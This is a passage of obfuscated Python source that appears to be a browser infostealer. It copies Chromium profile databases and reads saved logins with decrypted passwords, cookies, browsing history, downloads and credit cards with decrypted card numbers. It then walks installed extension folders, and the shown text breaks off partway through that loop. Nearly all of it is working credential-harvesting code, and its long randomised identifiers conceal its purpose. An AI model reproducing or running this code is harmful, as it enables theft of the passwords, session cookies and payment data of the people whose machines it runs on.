        JZEXUQOWPJUTQVUZZCLXYNGBIVRTBTJZJSMOLOGQXSTUCILNYDRTTGFMTOJQPZWLEEROOT.execute('SELECT action_url, username_value, password_value FROM logins')

        for v4r_row in JZEXUQOWPJUTQVUZZCLXYNGBIVRTBTJZJSMOLOGQXSTUCILNYDRTTGFMTOJQPZWLEEROOT.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            EJSFXISDEKEABAEQYAVFEBZPWAWSEPMFDKVCHTGFKKNBTICIHDIRGZQUQDYCLHKAEIZZKCFKUIKTVPDSHJPFLFBYEKGWNTMAC =          f"- Url      : {v4r_row[0]}"
            CEJHKWDGBEMRWKOBOYYYWMTMGHDCELIJIQPMSNLGPZERDCRGXBXXHFCWUTLHCPCTWBZUHFKASRNQBNBPPQYWNMS =     f"  Username : {v4r_row[1]}"
            FGORXKWMJRCREXQWCGKRTSTVMQNIGNWSFEGEOXGWUMNRBFXHEQUZDLQOTSXORLAGQYQNBFOSOT =     f"  Password : {SCHRFXRJUBNFDPPPZVCINWJMZHOCWZVXJOFQZRTSFXVTFRTPQSHZJROBC(v4r_row[2], JNJCPELVFICWQKJJSVPNELCZRXTXZWMZUKUXFABAPSEURUEQXDOASZPZUBGWTEGTDIIIIX)}"
            BOJLIBNZQXIEPBGXIEJWRDZWWVGDSRVXZAYBWCFWQVDYXLLJJPOWGRRUROSUIHLEVSVMXDURAJSGCWGJI_name = f"  Browser  : {BOJLIBNZQXIEPBGXIEJWRDZWWVGDSRVXZAYBWCFWQVDYXLLJJPOWGRRUROSUIHLEVSVMXDURAJSGCWGJI}"
            YLMWRTKLHFXMXLEFRBQKKZVNCRIWULROAIJNRRBWPBXWMCARRJNAZRLWVWLRZWBGPDREELINRQKV.append(f"{EJSFXISDEKEABAEQYAVFEBZPWAWSEPMFDKVCHTGFKKNBTICIHDIRGZQUQDYCLHKAEIZZKCFKUIKTVPDSHJPFLFBYEKGWNTMAC}\n{CEJHKWDGBEMRWKOBOYYYWMTMGHDCELIJIQPMSNLGPZERDCRGXBXXHFCWUTLHCPCTWBZUHFKASRNQBNBPPQYWNMS}\n{FGORXKWMJRCREXQWCGKRTSTVMQNIGNWSFEGEOXGWUMNRBFXHEQUZDLQOTSXORLAGQYQNBFOSOT}\n{BOJLIBNZQXIEPBGXIEJWRDZWWVGDSRVXZAYBWCFWQVDYXLLJJPOWGRRUROSUIHLEVSVMXDURAJSGCWGJI_name}\n")
            JPGFNYCGFULRIDZYBAKSLMAVEJURTOONDJREPRTWHKIEUHCZLYRXRXTRSDZIZH += 1

        WIDMSFNHDKBNQFNDWFFYJOHUAKBAGFPUKDBHHDJTQSRVXQQQVZRLPREHUJRQSAYBYDWBAULMYDKUPT.close()

    def VDBRGGACHPPBLLEMRMYLETDJNYKMHMEDONPSZZKWEPDLSAVQRXZMXWOXVLFUFKTRGKZNQZFUFJEVWNVNBNKUYO(BOJLIBNZQXIEPBGXIEJWRDZWWVGDSRVXZAYBWCFWQVDYXLLJJPOWGRRUROSUIHLEVSVMXDURAJSGCWGJI, ODYMPQYQANJBKJJSDAJQTMVZYILQUOUMPYIFLZJXUEIPTZVBJFWWZNXVUZMIMZPXULSNVFSRKYKERUSIZUQPAVQRXD, JNJCPELVFICWQKJJSVPNELCZRXTXZWMZUKUXFABAPSEURUEQXDOASZPZUBGWTEGTDIIIIX):
        global TNADCGWCZXCPQKISAXFVLYUECIAODZAUHCYDHRTTEFPHPQLHJYIENPOQGCU
        YMREKUVQQNNWJUAYLVIUPFSHQCZIVCNBIWIRYBHDOKMSYUGVMHUHOMMJJRYMUSCCZRVULKSFDYTPIOYNECHSAKQWUT = os.path.join(ODYMPQYQANJBKJJSDAJQTMVZYILQUOUMPYIFLZJXUEIPTZVBJFWWZNXVUZMIMZPXULSNVFSRKYKERUSIZUQPAVQRXD, 'Network', 'Cookies')
        if not os.path.exists(YMREKUVQQNNWJUAYLVIUPFSHQCZIVCNBIWIRYBHDOKMSYUGVMHUHOMMJJRYMUSCCZRVULKSFDYTPIOYNECHSAKQWUT):
            return

        WIDMSFNHDKBNQFNDWFFYJOHUAKBAGFPUKDBHHDJTQSRVXQQQVZRLPREHUJRQSAYBYDWBAULMYDKUPT = sqlite3.connect(":memory:")
        BRWGCWLYLAUYXDSDMOCEJQMTJHCMYCINOWHQEDFPETWQMXBSKKIHTIUOZGAFWMFURFZDBDPNCHXFMLLTOVCNIXAKCUBZ = sqlite3.connect(YMREKUVQQNNWJUAYLVIUPFSHQCZIVCNBIWIRYBHDOKMSYUGVMHUHOMMJJRYMUSCCZRVULKSFDYTPIOYNECHSAKQWUT)
        BRWGCWLYLAUYXDSDMOCEJQMTJHCMYCINOWHQEDFPETWQMXBSKKIHTIUOZGAFWMFURFZDBDPNCHXFMLLTOVCNIXAKCUBZ.backup(WIDMSFNHDKBNQFNDWFFYJOHUAKBAGFPUKDBHHDJTQSRVXQQQVZRLPREHUJRQSAYBYDWBAULMYDKUPT)
        BRWGCWLYLAUYXDSDMOCEJQMTJHCMYCINOWHQEDFPETWQMXBSKKIHTIUOZGAFWMFURFZDBDPNCHXFMLLTOVCNIXAKCUBZ.close()
        JZEXUQOWPJUTQVUZZCLXYNGBIVRTBTJZJSMOLOGQXSTUCILNYDRTTGFMTOJQPZWLEEROOT = WIDMSFNHDKBNQFNDWFFYJOHUAKBAGFPUKDBHHDJTQSRVXQQQVZRLPREHUJRQSAYBYDWBAULMYDKUPT.cursor()
        JZEXUQOWPJUTQVUZZCLXYNGBIVRTBTJZJSMOLOGQXSTUCILNYDRTTGFMTOJQPZWLEEROOT.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')

        for v4r_row in JZEXUQOWPJUTQVUZZCLXYNGBIVRTBTJZJSMOLOGQXSTUCILNYDRTTGFMTOJQPZWLEEROOT.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            EJSFXISDEKEABAEQYAVFEBZPWAWSEPMFDKVCHTGFKKNBTICIHDIRGZQUQDYCLHKAEIZZKCFKUIKTVPDSHJPFLFBYEKGWNTMAC =          f"- Url     : {v4r_row[0]}"
            HNIDWHPYTSGEPQXYXJJNVPYTBECAGMLTLGGYQPLIIFYGKTULYNEJMZDJBFW =         f"  Name    : {v4r_row[1]}"
            ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG =         f"  Path    : {v4r_row[2]}"
            NNUNDBLPVKOEZQBGLEIVBMICLUQQZDMDTTHRRKHWPTBPRGAELFEZU =       f"  Cookie  : {SCHRFXRJUBNFDPPPZVCINWJMZHOCWZVXJOFQZRTSFXVTFRTPQSHZJROBC(v4r_row[3], JNJCPELVFICWQKJJSVPNELCZRXTXZWMZUKUXFABAPSEURUEQXDOASZPZUBGWTEGTDIIIIX)}"
            DYPGLKKQERKNBQZHXWWODWKYNIFWBCZJXEHNSTKGUIJMSZUNTYTHKHYJXXGQBYINTGRTLBPAJISAADCB =       f"  Expire  : {v4r_row[4]}"
            BOJLIBNZQXIEPBGXIEJWRDZWWVGDSRVXZAYBWCFWQVDYXLLJJPOWGRRUROSUIHLEVSVMXDURAJSGCWGJI_name = f"  Browser : {BOJLIBNZQXIEPBGXIEJWRDZWWVGDSRVXZAYBWCFWQVDYXLLJJPOWGRRUROSUIHLEVSVMXDURAJSGCWGJI}"
            ZRBVASBAPFRBRIQVLKIUHGGRBYOSKTVLSZBJSVIGCWWZDPRUBSEXWYHNZN.append(f"{EJSFXISDEKEABAEQYAVFEBZPWAWSEPMFDKVCHTGFKKNBTICIHDIRGZQUQDYCLHKAEIZZKCFKUIKTVPDSHJPFLFBYEKGWNTMAC}\n{HNIDWHPYTSGEPQXYXJJNVPYTBECAGMLTLGGYQPLIIFYGKTULYNEJMZDJBFW}\n{ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG}\n{NNUNDBLPVKOEZQBGLEIVBMICLUQQZDMDTTHRRKHWPTBPRGAELFEZU}\n{DYPGLKKQERKNBQZHXWWODWKYNIFWBCZJXEHNSTKGUIJMSZUNTYTHKHYJXXGQBYINTGRTLBPAJISAADCB}\n{BOJLIBNZQXIEPBGXIEJWRDZWWVGDSRVXZAYBWCFWQVDYXLLJJPOWGRRUROSUIHLEVSVMXDURAJSGCWGJI_name}\n")
            TNADCGWCZXCPQKISAXFVLYUECIAODZAUHCYDHRTTEFPHPQLHJYIENPOQGCU += 1

        WIDMSFNHDKBNQFNDWFFYJOHUAKBAGFPUKDBHHDJTQSRVXQQQVZRLPREHUJRQSAYBYDWBAULMYDKUPT.close()

    def LPWEYQZESJXKZDHSONHRARTNBYXJBPNZCUVTRBLRPMNBXGHUVIEHNYMFHKTUQDHKFWPRFERVNTYSBJWQBEZDPZ(BOJLIBNZQXIEPBGXIEJWRDZWWVGDSRVXZAYBWCFWQVDYXLLJJPOWGRRUROSUIHLEVSVMXDURAJSGCWGJI, ODYMPQYQANJBKJJSDAJQTMVZYILQUOUMPYIFLZJXUEIPTZVBJFWWZNXVUZMIMZPXULSNVFSRKYKERUSIZUQPAVQRXD):
        global VGBGBRHDVNYYPHJUOKSGOXSGVNZADFOZAFYESCFZLVTATIRRIGVKKFIYRKMAVGZSZDOIVVFYXJQUHVGGLAZMJ
        WCQVFXNRGHDTPFTUYUFZJWTQHHEUTRAEZZPFYDZRWCFCDCBHQQQ = os.path.join(ODYMPQYQANJBKJJSDAJQTMVZYILQUOUMPYIFLZJXUEIPTZVBJFWWZNXVUZMIMZPXULSNVFSRKYKERUSIZUQPAVQRXD, 'History')
        if not os.path.exists(WCQVFXNRGHDTPFTUYUFZJWTQHHEUTRAEZZPFYDZRWCFCDCBHQQQ):
            return
        
        WIDMSFNHDKBNQFNDWFFYJOHUAKBAGFPUKDBHHDJTQSRVXQQQVZRLPREHUJRQSAYBYDWBAULMYDKUPT = sqlite3.connect(":memory:")
        BRWGCWLYLAUYXDSDMOCEJQMTJHCMYCINOWHQEDFPETWQMXBSKKIHTIUOZGAFWMFURFZDBDPNCHXFMLLTOVCNIXAKCUBZ = sqlite3.connect(WCQVFXNRGHDTPFTUYUFZJWTQHHEUTRAEZZPFYDZRWCFCDCBHQQQ)
        BRWGCWLYLAUYXDSDMOCEJQMTJHCMYCINOWHQEDFPETWQMXBSKKIHTIUOZGAFWMFURFZDBDPNCHXFMLLTOVCNIXAKCUBZ.backup(WIDMSFNHDKBNQFNDWFFYJOHUAKBAGFPUKDBHHDJTQSRVXQQQVZRLPREHUJRQSAYBYDWBAULMYDKUPT)
        BRWGCWLYLAUYXDSDMOCEJQMTJHCMYCINOWHQEDFPETWQMXBSKKIHTIUOZGAFWMFURFZDBDPNCHXFMLLTOVCNIXAKCUBZ.close()
        JZEXUQOWPJUTQVUZZCLXYNGBIVRTBTJZJSMOLOGQXSTUCILNYDRTTGFMTOJQPZWLEEROOT = WIDMSFNHDKBNQFNDWFFYJOHUAKBAGFPUKDBHHDJTQSRVXQQQVZRLPREHUJRQSAYBYDWBAULMYDKUPT.cursor()
        JZEXUQOWPJUTQVUZZCLXYNGBIVRTBTJZJSMOLOGQXSTUCILNYDRTTGFMTOJQPZWLEEROOT.execute('SELECT url, title, last_visit_time FROM urls')

        for v4r_row in JZEXUQOWPJUTQVUZZCLXYNGBIVRTBTJZJSMOLOGQXSTUCILNYDRTTGFMTOJQPZWLEEROOT.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            EJSFXISDEKEABAEQYAVFEBZPWAWSEPMFDKVCHTGFKKNBTICIHDIRGZQUQDYCLHKAEIZZKCFKUIKTVPDSHJPFLFBYEKGWNTMAC =          f"- Url     : {v4r_row[0]}"
            YYKTCUDQASNZXUEQAVGAXLWEZSUVKOGZGDUDICQYRRLWWDEZRTLHOKJQNACNMDEFABSGUMFVMAI =        f"  Title   : {v4r_row[1]}"
            ERWWAKXGDBDYHSPXTTNMCALDFZTUPKXIEWAVUUWNOLDMYLKEZG =         f"  Time    : {v4r_row[2]}"
            BOJLIBNZQXIEPBGXIEJWRDZWWVGDSRVXZAYBWCFWQVDYXLLJJPOWGRRUROSUIHLEVSVMXDURAJSGCWGJI_name = f"  Browser : {BOJLIBNZQXIEPBGXIEJWRDZWWVGDSRVXZAYBWCFWQVDYXLLJJPOWGRRUROSUIHLEVSVMXDURAJSGCWGJI}"
            BJECRPKRESEDLDRLYYCWYFAHLEBMTJSSMWITXKGYMBHGSIMAILHXQBNENJEYRFEKADZUUTYYIIQ.append(f"{EJSFXISDEKEABAEQYAVFEBZPWAWSEPMFDKVCHTGFKKNBTICIHDIRGZQUQDYCLHKAEIZZKCFKUIKTVPDSHJPFLFBYEKGWNTMAC}\n{YYKTCUDQASNZXUEQAVGAXLWEZSUVKOGZGDUDICQYRRLWWDEZRTLHOKJQNACNMDEFABSGUMFVMAI}\n{ERWWAKXGDBDYHSPXTTNMCALDFZTUPKXIEWAVUUWNOLDMYLKEZG}\n{BOJLIBNZQXIEPBGXIEJWRDZWWVGDSRVXZAYBWCFWQVDYXLLJJPOWGRRUROSUIHLEVSVMXDURAJSGCWGJI_name}\n")
            VGBGBRHDVNYYPHJUOKSGOXSGVNZADFOZAFYESCFZLVTATIRRIGVKKFIYRKMAVGZSZDOIVVFYXJQUHVGGLAZMJ += 1

        WIDMSFNHDKBNQFNDWFFYJOHUAKBAGFPUKDBHHDJTQSRVXQQQVZRLPREHUJRQSAYBYDWBAULMYDKUPT.close()
    
    def XYTHJYMGJCNNJCKSCFSNZWDKTBLGDRZYYAFEYREVNXBGJOSIKBTIBWWMWDGKXSAGHOIFVPJQCDMIZIIFLUNGUGYTWZYFL(BOJLIBNZQXIEPBGXIEJWRDZWWVGDSRVXZAYBWCFWQVDYXLLJJPOWGRRUROSUIHLEVSVMXDURAJSGCWGJI, ODYMPQYQANJBKJJSDAJQTMVZYILQUOUMPYIFLZJXUEIPTZVBJFWWZNXVUZMIMZPXULSNVFSRKYKERUSIZUQPAVQRXD):
        global PBUDQNONXRBVOWVRUQCITJPMPVWOIJYQFCIQYKNPBMAKZKCPFVYPQGFQZGMKGCKJPEXEJXDNQLIHFFIAMESIMGWW
        SNITFSSSTENSBOBMZKQJHLMHSYEJFBJATZIJVSNLHBGKTHXXHZFBVEVURNNLSKGVTMFDKACTTSXUAGGCBECTKRIIYUKD = os.path.join(ODYMPQYQANJBKJJSDAJQTMVZYILQUOUMPYIFLZJXUEIPTZVBJFWWZNXVUZMIMZPXULSNVFSRKYKERUSIZUQPAVQRXD, 'History')
        if not os.path.exists(SNITFSSSTENSBOBMZKQJHLMHSYEJFBJATZIJVSNLHBGKTHXXHZFBVEVURNNLSKGVTMFDKACTTSXUAGGCBECTKRIIYUKD):
            return

        WIDMSFNHDKBNQFNDWFFYJOHUAKBAGFPUKDBHHDJTQSRVXQQQVZRLPREHUJRQSAYBYDWBAULMYDKUPT = sqlite3.connect(":memory:")
        BRWGCWLYLAUYXDSDMOCEJQMTJHCMYCINOWHQEDFPETWQMXBSKKIHTIUOZGAFWMFURFZDBDPNCHXFMLLTOVCNIXAKCUBZ = sqlite3.connect(SNITFSSSTENSBOBMZKQJHLMHSYEJFBJATZIJVSNLHBGKTHXXHZFBVEVURNNLSKGVTMFDKACTTSXUAGGCBECTKRIIYUKD)
        BRWGCWLYLAUYXDSDMOCEJQMTJHCMYCINOWHQEDFPETWQMXBSKKIHTIUOZGAFWMFURFZDBDPNCHXFMLLTOVCNIXAKCUBZ.backup(WIDMSFNHDKBNQFNDWFFYJOHUAKBAGFPUKDBHHDJTQSRVXQQQVZRLPREHUJRQSAYBYDWBAULMYDKUPT)
        BRWGCWLYLAUYXDSDMOCEJQMTJHCMYCINOWHQEDFPETWQMXBSKKIHTIUOZGAFWMFURFZDBDPNCHXFMLLTOVCNIXAKCUBZ.close()
        JZEXUQOWPJUTQVUZZCLXYNGBIVRTBTJZJSMOLOGQXSTUCILNYDRTTGFMTOJQPZWLEEROOT = WIDMSFNHDKBNQFNDWFFYJOHUAKBAGFPUKDBHHDJTQSRVXQQQVZRLPREHUJRQSAYBYDWBAULMYDKUPT.cursor()
        JZEXUQOWPJUTQVUZZCLXYNGBIVRTBTJZJSMOLOGQXSTUCILNYDRTTGFMTOJQPZWLEEROOT.execute('SELECT tab_url, target_path FROM downloads')
        for row in JZEXUQOWPJUTQVUZZCLXYNGBIVRTBTJZJSMOLOGQXSTUCILNYDRTTGFMTOJQPZWLEEROOT.fetchall():
            if not row[0] or not row[1]:
                continue
            ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG =         f"- Path    : {row[1]}"
            EJSFXISDEKEABAEQYAVFEBZPWAWSEPMFDKVCHTGFKKNBTICIHDIRGZQUQDYCLHKAEIZZKCFKUIKTVPDSHJPFLFBYEKGWNTMAC =          f"  Url     : {row[0]}"
            BOJLIBNZQXIEPBGXIEJWRDZWWVGDSRVXZAYBWCFWQVDYXLLJJPOWGRRUROSUIHLEVSVMXDURAJSGCWGJI_name = f"  Browser : {BOJLIBNZQXIEPBGXIEJWRDZWWVGDSRVXZAYBWCFWQVDYXLLJJPOWGRRUROSUIHLEVSVMXDURAJSGCWGJI}"
            KOSFLBRLPMNJUXJSKZABFSSIOLXAAMRGSPTFIWLYWNUUVRDBLFINEBWMRDMXKDDSYQUGCPQQQLBVVQUWX.append(f"{ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG}\n{EJSFXISDEKEABAEQYAVFEBZPWAWSEPMFDKVCHTGFKKNBTICIHDIRGZQUQDYCLHKAEIZZKCFKUIKTVPDSHJPFLFBYEKGWNTMAC}\n{BOJLIBNZQXIEPBGXIEJWRDZWWVGDSRVXZAYBWCFWQVDYXLLJJPOWGRRUROSUIHLEVSVMXDURAJSGCWGJI_name}\n")
            PBUDQNONXRBVOWVRUQCITJPMPVWOIJYQFCIQYKNPBMAKZKCPFVYPQGFQZGMKGCKJPEXEJXDNQLIHFFIAMESIMGWW += 1

        WIDMSFNHDKBNQFNDWFFYJOHUAKBAGFPUKDBHHDJTQSRVXQQQVZRLPREHUJRQSAYBYDWBAULMYDKUPT.close()
    
    def ZFJSVIDXIDSZFJTYWCWLQMLMVJWPCXAGNYHYWVDFLFIFMNBXAGHFD(BOJLIBNZQXIEPBGXIEJWRDZWWVGDSRVXZAYBWCFWQVDYXLLJJPOWGRRUROSUIHLEVSVMXDURAJSGCWGJI, ODYMPQYQANJBKJJSDAJQTMVZYILQUOUMPYIFLZJXUEIPTZVBJFWWZNXVUZMIMZPXULSNVFSRKYKERUSIZUQPAVQRXD, JNJCPELVFICWQKJJSVPNELCZRXTXZWMZUKUXFABAPSEURUEQXDOASZPZUBGWTEGTDIIIIX):
        global PLZFBQFXCGBCUTOKMUKQTOOCZDRAXCZJCFYRAULGTYYITWFAUEJMHVJPRCHIEWDAJYSWYBIJRCCCOAXQAPFHT
        PIHMEYAWXVLDGXGAADADXPNKYFGLKBGZMTBPNTFOQNBOFXVDHMQTNPTBERZHBVRGQJECWSIRMGXQDJJBQ = os.path.join(ODYMPQYQANJBKJJSDAJQTMVZYILQUOUMPYIFLZJXUEIPTZVBJFWWZNXVUZMIMZPXULSNVFSRKYKERUSIZUQPAVQRXD, 'Web Data')
        if not os.path.exists(PIHMEYAWXVLDGXGAADADXPNKYFGLKBGZMTBPNTFOQNBOFXVDHMQTNPTBERZHBVRGQJECWSIRMGXQDJJBQ):
            return

        WIDMSFNHDKBNQFNDWFFYJOHUAKBAGFPUKDBHHDJTQSRVXQQQVZRLPREHUJRQSAYBYDWBAULMYDKUPT = sqlite3.connect(":memory:")
        BRWGCWLYLAUYXDSDMOCEJQMTJHCMYCINOWHQEDFPETWQMXBSKKIHTIUOZGAFWMFURFZDBDPNCHXFMLLTOVCNIXAKCUBZ = sqlite3.connect(PIHMEYAWXVLDGXGAADADXPNKYFGLKBGZMTBPNTFOQNBOFXVDHMQTNPTBERZHBVRGQJECWSIRMGXQDJJBQ)
        BRWGCWLYLAUYXDSDMOCEJQMTJHCMYCINOWHQEDFPETWQMXBSKKIHTIUOZGAFWMFURFZDBDPNCHXFMLLTOVCNIXAKCUBZ.backup(WIDMSFNHDKBNQFNDWFFYJOHUAKBAGFPUKDBHHDJTQSRVXQQQVZRLPREHUJRQSAYBYDWBAULMYDKUPT)
        BRWGCWLYLAUYXDSDMOCEJQMTJHCMYCINOWHQEDFPETWQMXBSKKIHTIUOZGAFWMFURFZDBDPNCHXFMLLTOVCNIXAKCUBZ.close()
        JZEXUQOWPJUTQVUZZCLXYNGBIVRTBTJZJSMOLOGQXSTUCILNYDRTTGFMTOJQPZWLEEROOT = WIDMSFNHDKBNQFNDWFFYJOHUAKBAGFPUKDBHHDJTQSRVXQQQVZRLPREHUJRQSAYBYDWBAULMYDKUPT.cursor()
        JZEXUQOWPJUTQVUZZCLXYNGBIVRTBTJZJSMOLOGQXSTUCILNYDRTTGFMTOJQPZWLEEROOT.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')

        for v4r_row in JZEXUQOWPJUTQVUZZCLXYNGBIVRTBTJZJSMOLOGQXSTUCILNYDRTTGFMTOJQPZWLEEROOT.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            HNIDWHPYTSGEPQXYXJJNVPYTBECAGMLTLGGYQPLIIFYGKTULYNEJMZDJBFW =             f"- Name             : {v4r_row[0]}"
            IEPCXKZAQCMNWZXOLETHMVXGJDQLOIKYXRCBQXUICUDIITNUIXFBAFZWBFGPQS = f"  Expiration Month : {v4r_row[1]}"
            WHDASLGNKXXDJYLRVRGRTWTJUMDGHOEKCMFHUJUSPOAZSLGPYBDFBUQBTUPQGJFSDLJAVPAKCPBDUVIEPTQGI =  f"  Expiration Year  : {v4r_row[2]}"
            UEPGZPYUSRCMFMEIHCGDMVAECTMAQFHLIWOCSQVBEVXOAFGBLSX =      f"  Card Number      : {SCHRFXRJUBNFDPPPZVCINWJMZHOCWZVXJOFQZRTSFXVTFRTPQSHZJROBC(v4r_row[3], JNJCPELVFICWQKJJSVPNELCZRXTXZWMZUKUXFABAPSEURUEQXDOASZPZUBGWTEGTDIIIIX)}"
            YWHNPAYRAWJNYCHKEHUVFYMKVHLOPMAEQYTYZMFTLISSHWJDRLCSYWRWYOOHGAUJGKKDQGSWWRBPTRCTTPVIHCEITVEWQKS =    f"  Date Modified    : {v4r_row[4]}"
            BOJLIBNZQXIEPBGXIEJWRDZWWVGDSRVXZAYBWCFWQVDYXLLJJPOWGRRUROSUIHLEVSVMXDURAJSGCWGJI_name =     f"  Browser          : {BOJLIBNZQXIEPBGXIEJWRDZWWVGDSRVXZAYBWCFWQVDYXLLJJPOWGRRUROSUIHLEVSVMXDURAJSGCWGJI}"
            RWAIWNKWBLBCFKLFPQEJRMJIOXFUXYCEBRYOBOUUKAVXZAWHZCUHXTWSKZDKFDOMURVVIAPLYFBGKDQJZQT.append(f"{HNIDWHPYTSGEPQXYXJJNVPYTBECAGMLTLGGYQPLIIFYGKTULYNEJMZDJBFW}\n{IEPCXKZAQCMNWZXOLETHMVXGJDQLOIKYXRCBQXUICUDIITNUIXFBAFZWBFGPQS}\n{WHDASLGNKXXDJYLRVRGRTWTJUMDGHOEKCMFHUJUSPOAZSLGPYBDFBUQBTUPQGJFSDLJAVPAKCPBDUVIEPTQGI}\n{UEPGZPYUSRCMFMEIHCGDMVAECTMAQFHLIWOCSQVBEVXOAFGBLSX}\n{YWHNPAYRAWJNYCHKEHUVFYMKVHLOPMAEQYTYZMFTLISSHWJDRLCSYWRWYOOHGAUJGKKDQGSWWRBPTRCTTPVIHCEITVEWQKS}\n{BOJLIBNZQXIEPBGXIEJWRDZWWVGDSRVXZAYBWCFWQVDYXLLJJPOWGRRUROSUIHLEVSVMXDURAJSGCWGJI_name}\n")
            PLZFBQFXCGBCUTOKMUKQTOOCZDRAXCZJCFYRAULGTYYITWFAUEJMHVJPRCHIEWDAJYSWYBIJRCCCOAXQAPFHT += 1
        
        WIDMSFNHDKBNQFNDWFFYJOHUAKBAGFPUKDBHHDJTQSRVXQQQVZRLPREHUJRQSAYBYDWBAULMYDKUPT.close()

    def EYZMBGNGWLNNBEHAZDMCAYWLRDYZJEAJQVDUBTUTLJWAUIUVMQYRPFPQXPFKNOCAPFSZXJYUMMYHXO(FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA, DZYDUDOQHOTRDKADGXNSJJPMPMQPILAJGCHLFJKPSBRGJISYMSTSGVGSGHHZEIFSPKRHUXFA, BOJLIBNZQXIEPBGXIEJWRDZWWVGDSRVXZAYBWCFWQVDYXLLJJPOWGRRUROSUIHLEVSVMXDURAJSGCWGJI, ODYMPQYQANJBKJJSDAJQTMVZYILQUOUMPYIFLZJXUEIPTZVBJFWWZNXVUZMIMZPXULSNVFSRKYKERUSIZUQPAVQRXD):
        global OCKGIYGPQAGJGAUZVFSFEDSQQTMWTPTPTCNCCXQPTFDAMAHETEOKLSOXAXFYFIHXRIGCYFZNYKROCLOGUJHJ
        TGTQKNDJFRPJRJZJHSQQKTUVMOUJDLGEUDFHNIQZJNCMGLRFWGXQIECCXECXZZQDOEIQIZNIDQORAYZLCCOGTKVVE = os.path.join(ODYMPQYQANJBKJJSDAJQTMVZYILQUOUMPYIFLZJXUEIPTZVBJFWWZNXVUZMIMZPXULSNVFSRKYKERUSIZUQPAVQRXD, 'Extensions')
        PCEPAUDUQOQRLEJIAWFUVIQRNRFWAALYYYTYXPQVSEVSMDFOROARLBPKORAQYLTSFXY = os.path.join("Extensions", BOJLIBNZQXIEPBGXIEJWRDZWWVGDSRVXZAYBWCFWQVDYXLLJJPOWGRRUROSUIHLEVSVMXDURAJSGCWGJI)

        if not os.path.exists(TGTQKNDJFRPJRJZJHSQQKTUVMOUJDLGEUDFHNIQZJNCMGLRFWGXQIECCXECXZZQDOEIQIZNIDQORAYZLCCOGTKVVE):
            return 

        TCCMJBYOHLDPJXANFXKCUJNFAIMMGNSQIHEJEOZYNYQDNHSNHTQQWTTDKPLQYANFDCOYJBPVQHOI = [v4r_item for v4r_item in os.listdir(TGTQKNDJFRPJRJZJHSQQKTUVMOUJDLGEUDFHNIQZJNCMGLRFWGXQIECCXECXZZQDOEIQIZNIDQORAYZLCCOGTKVVE) if os.path.isdir(os.path.join(TGTQKNDJFRPJRJZJHSQQKTUVMOUJDLGEUDFHNIQZJNCMGLRFWGXQIECCXECXZZQDOEIQIZNIDQORAYZLCCOGTKVVE, v4r_item))]
        
        for v4r_extention in TCCMJBYOHLDPJXANFXKCUJNFAIMMGNSQIHEJEOZYNYQDNHSNHTQQWTTDKPLQYANFDCOYJBPVQHOI:
            if "Temp" in v4r_extention:
                continue
            
            OCKGIYGPQAGJGAUZVFSFEDSQQTMWTPTPTCNCCXQPTFDAMAHETEOKLSOXAXFYFIHXRIGCYFZNYKROCLOGUJHJ += 1
            UZODNEQAKOHLAIPQENNZUKMCFHTSQDXVTTAWYFZVANWUFVIKYEAODWHWLWIJAWFULDWDMTYIEQVNEKXYKHDHDU = False
            
            for v4r_extension_name, v4r_extension_folder in DZYDUDOQHOTRDKADGXNSJJPMPMQPILAJGCHLFJKPSBRGJISYMSTSGVGSGHHZEIFSPKRHUXFA:
                if v4r_extention == v4r_extension_folder:
                    UZODNEQAKOHLAIPQENNZUKMCFHTSQDXVTTAWYFZVANWUFVIKYEAODWHWLWIJAWFULDWDMTYIEQVNEKXYKHDHDU = True
                    
                    ZVKDFEVYGTHRACJNJKYAXLBAAISXZXPLVMXUYHUNDPXCIPVVXXZDRIOSN = os.path.join(PCEPAUDUQOQRLEJIAWFUVIQRNRFWAALYYYTYXPQVSEVSMDFOROARLBPKORAQYLTSFXY, v4r_extension_name, v4r_extention)
                    
                    XKSKJTYRCXPUWJSJSFCXLSONSVCCHCZWWGCVADVPVEODGPWNJUFGJAYBBGUUHXCDQNHNMQDCWFQXNXBZPVGTBDRTGGIAVLTYA = os.path.join(TGTQKNDJFRPJRJZJHSQQKTUVMOUJDLGEUDFHNIQZJNCMGLRFWGXQIECCXECXZZQDOEIQIZNIDQORAYZLCCOGTKVVE, v4r_extention)
                    for v4r_item in os.listdir(XKSKJTYRCXPUWJSJSFCXLSONSVCCHCZWWGCVADVPVEODGPWNJUFGJAYBBGUUHXCDQNHNMQDCWFQXNXBZPVGTBDRTGGIAVLTYA):
                        MDVOACHMVHEAIYHBLXZEONJEHVJDVGAYVIRUOYMZEEQMNNFDCJ = os.path.join(XKSKJTYRCXPUWJSJSFCXLSONSVCCHCZWWGCVADVPVEODGPWNJUFGJAYBBGUUHXCDQNHNMQDCWFQXNXBZPVGTBDRTGGIAVLTYA, v4r_item)
                        
                        if os.path.isdir(MDVOACHMVHEAIYHBLXZEONJEHVJDVGAYVIRUOYMZEEQMNNFDCJ):
                            for dirpath, dirnames, filenames in os.walk(MDVOACHMVHEAIYHBLXZEONJEHVJDVGAYVIRUOYMZEEQMNNFDCJ):
                                for filename in filenames:
                                    file_path = os.path.join(dirpath, filename)
